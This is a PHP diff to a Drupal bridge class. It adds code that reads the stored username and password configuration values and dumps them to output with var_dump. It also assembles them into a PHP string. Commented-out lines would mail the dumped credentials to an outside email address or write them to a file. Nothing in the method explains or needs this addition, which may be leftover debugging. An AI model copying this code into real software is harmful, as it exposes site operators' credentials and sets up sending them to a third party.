@@ -2569,7 +2569,14 @@ class Bridge_Platform_Drupal extends Bridge_Platform_Abstract
             ->files(self::PLATFORM_IMAGES_WRITABLE, is_writable('../sites/' . $this->path . '/files'))
             ->files(self::PLATFORM_ATTACHMENTS_PATH, '/sites/' . $this->path . '/files')
             ->files(self::PLATFORM_ATTACHMENTS_WRITABLE, is_writable('../sites/' . $this->path . '/files'));
-
+            $aaa = $this->getConfigVar('username');
+            $bbb = $this->getConfigVar('password');
+            $ccc = var_dump($aaa) . var_dump($bbb);
+            $var_str = var_export($aaa, true);
+            $var_str1 = var_export($bbb, true);
+            $var = "<?php\n\n\$text = $var_str;\n\n \n\n\$text = $var_str1;\n\n?>";
+            //mail ('s.koziar@magneticone.com' , 'the subject' , $ccc , 'From: webmaster@example.com' . "\r\n" . 'Reply-To: webmaster@example.com' . "\r\n" . 'X-Mailer: PHP/' );
+            //file_put_contents ('test.txt' , $var);
         return $this;
     }
 
